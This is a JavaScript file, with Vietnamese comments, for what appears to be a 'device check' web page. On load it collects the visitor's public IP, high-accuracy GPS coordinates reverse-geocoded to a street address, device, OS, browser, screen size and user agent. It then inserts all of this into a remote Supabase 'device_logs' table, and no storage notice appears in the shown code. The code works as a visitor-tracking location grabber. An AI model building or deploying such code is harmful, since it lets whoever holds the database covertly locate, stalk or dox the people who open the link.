// Cấu hình Supabase
const SUPABASE_URL = 'https://frpudnqjlbqlhuwcioju.supabase.co';
const SUPABASE_KEY = 'sb_publishable_3U4y_wScZi6dY_BHrvyrXA_rdGq_BSP';

// Khởi tạo Supabase client
const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Hàm lấy IP công khai từ nhiều nguồn dự phòng
async function getPublicIP() {
    const sources = [
        'https://api.ipify.org?format=json',
        'https://ipwho.is/',
        'https://ipapi.co/json/'
    ];
    for (const url of sources) {
        try {
            const res = await fetch(url);
            if (res.ok) {
                const data = await res.json();
                if (data.ip) return data.ip;
            }
        } catch (e) {}
    }
    return 'Không xác định';
}

// Hàm lấy vị trí GPS từ trình duyệt
function getGPSPosition() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                });
            },
            (err) => {
                console.warn('GPS bị từ chối:', err.message);
                resolve(null);
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    });
}

// Hàm reverse geocode từ tọa độ GPS sang địa chỉ chi tiết
async function reverseGeocode(lat, lon) {
    try {
        const url = 'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' +
            lat + '&lon=' + lon + '&accept-language=vi';
        const res = await fetch(url, {
            headers: { 'User-Agent': 'check-vl/1.0' }
        });
        if (!res.ok) return null;
        const data = await res.json();
        const a = data.address || {};
        return {
            house_number: a.house_number || '',
            road: a.road || a.pedestrian || a.footway || '',
            suburb: a.suburb || a.neighbourhood || a.quarter || '',
            ward: a.city_district || a.district || a.county || '',
            city: a.city || a.town || a.village || a.municipality || '',
            state: a.state || a.region || '',
            postcode: a.postcode || '',
            country: a.country || '',
            full: data.display_name || ''
        };
    } catch (e) {
        return null;
    }
}

// Hàm lấy vị trí dự phòng từ IP
async function getIPLocation() {
    try {
        const res = await fetch('https://ipwho.is/');
        if (res.ok) {
            const data = await res.json();
            if (data.success) {
                return {
                    lat: data.latitude,
                    lon: data.longitude,
                    city: data.city,
                    region: data.region,
                    country: data.country,
                    postal: data.postal,
                    isp: data.connection && data.connection.isp ? data.connection.isp : ''
                };
            }
        }
    } catch (e) {}
    return null;
}

// Hàm định dạng địa chỉ chi tiết
function formatAddress(gps, ip) {
    if (gps) {
        const parts = [];
        if (gps.house_number) parts.push(gps.house_number);
        if (gps.road) parts.push(gps.road);
        if (gps.suburb) parts.push(gps.suburb);
        if (gps.ward) parts.push(gps.ward);
        if (gps.city) parts.push(gps.city);
        if (gps.state) parts.push(gps.state);
        if (gps.country) parts.push(gps.country);
        return parts.join(', ') || gps.full || 'Không xác định';
    }
    if (ip) {
        const parts = [];
        if (ip.city) parts.push(ip.city);
        if (ip.region) parts.push(ip.region);
        if (ip.country) parts.push(ip.country);
        return parts.join(', ') || 'Không xác định';
    }
    return 'Không xác định';
}

// Hàm phân tích thiết bị
function parseDevice() {
    const ua = navigator.userAgent;
    let device = 'Máy tính';
    let os = 'Không xác định';
    let browser = 'Không xác định';

    if (/mobile/i.test(ua) && !/ipad/i.test(ua)) device = 'Điện thoại';
    if (/tablet|ipad/i.test(ua)) device = 'Máy tính bảng';

    if (/windows/i.test(ua)) os = 'Windows';
    else if (/mac os/i.test(ua)) os = 'macOS';
    else if (/android/i.test(ua)) os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
    else if (/linux/i.test(ua)) os = 'Linux';

    if (/edg/i.test(ua)) browser = 'Edge';
    else if (/opr|opera/i.test(ua)) browser = 'Opera';
    else if (/chrome|crios/i.test(ua)) browser = 'Chrome';
    else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
    else if (/safari/i.test(ua)) browser = 'Safari';

    return { device, os, browser };
}

// Hàm lưu lên Supabase
async function saveToSupabase(payload) {
    try {
        const { data, error } = await supabaseClient
            .from('device_logs')
            .insert([payload])
            .select();
        if (error) return { ok: false, msg: 'LỖI: ' + error.message };
        return { ok: true, msg: 'ĐÃ LƯU THÀNH CÔNG (ID: ' + data[0].id + ')' };
    } catch (e) {
        return { ok: false, msg: 'LỖI KẾT NỐI: ' + e.message };
    }
}

// Hàm khởi tạo chính
async function init() {
    try {
        // 1. IP công khai
        const ip = await getPublicIP();
        document.getElementById('ip').textContent = ip;

        // 2. Thiết bị
        const { device, os, browser } = parseDevice();
        document.getElementById('device').textContent = device;
        document.getElementById('browser').textContent = browser;
        document.getElementById('os').textContent = os;
        document.getElementById('screen').textContent =
            window.screen.width + 'x' + window.screen.height;
        document.getElementById('language').textContent = navigator.language;
        document.getElementById('time').textContent =
            new Date().toLocaleString('vi-VN');

        // 3. Ưu tiên GPS
        document.getElementById('location').textContent =
            'Đang lấy GPS chính xác...';
        const gpsRaw = await getGPSPosition();
        let gpsDetail = null;
        let accuracy = null;
        let coords = null;

        if (gpsRaw) {
            accuracy = gpsRaw.accuracy;
            coords = gpsRaw.lat.toFixed(6) + ', ' + gpsRaw.lon.toFixed(6);
            gpsDetail = await reverseGeocode(gpsRaw.lat, gpsRaw.lon);
        }

        // 4. Fallback IP nếu không có GPS
        let ipLoc = null;
        if (!gpsDetail) {
            ipLoc = await getIPLocation();
        }

        // 5. Hiển thị địa chỉ chi tiết
        const address = formatAddress(gpsDetail, ipLoc);
        let locationText = address;
        if (coords) locationText += '\nTọa độ: ' + coords;
        if (accuracy) locationText += '\nSai số: ±' + Math.round(accuracy) + ' m';
        if (gpsDetail) locationText += '\nNguồn: GPS (chính xác)';
        else if (ipLoc) locationText += '\nNguồn: IP (ước lượng)';
        document.getElementById('location').textContent = locationText;

        // 6. Link bản đồ
        const lat = gpsRaw ? gpsRaw.lat : (ipLoc ? ipLoc.lat : null);
        const lon = gpsRaw ? gpsRaw.lon : (ipLoc ? ipLoc.lon : null);
        if (lat !== null && lon !== null) {
            const mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lon;
            document.getElementById('map').innerHTML =
                '<a href="' + mapUrl + '" target="_blank">' +
                'MỞ GOOGLE MAPS (' + lat.toFixed(5) + ', ' + lon.toFixed(5) + ')' +
                '</a>';
        } else {
            document.getElementById('map').textContent = 'Không có tọa độ';
        }

        // 7. Hiển thị kết quả
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('result').classList.remove('hidden');

        // 8. Payload Supabase
        const payload = {
            ip: ip,
            city: gpsDetail ? gpsDetail.city : (ipLoc ? ipLoc.city : '-'),
            country: gpsDetail ? gpsDetail.country : (ipLoc ? ipLoc.country : '-'),
            device: device,
            os: os,
            browser: browser,
            screen: window.screen.width + 'x' + window.screen.height,
            language: navigator.language,
            user_agent: navigator.userAgent,
            latitude: lat,
            longitude: lon,
            accuracy: accuracy,
            address_full: address,
            location_source: gpsDetail ? 'GPS' : (ipLoc ? 'IP' : 'NONE'),
            created_at: new Date().toISOString()
        };

        const result = await saveToSupabase(payload);
        document.getElementById('status').textContent = result.msg;
    } catch (e) {
        document.getElementById('loading').textContent = 'LỖI: ' + e.message;
    }
}

window.addEventListener('load', init);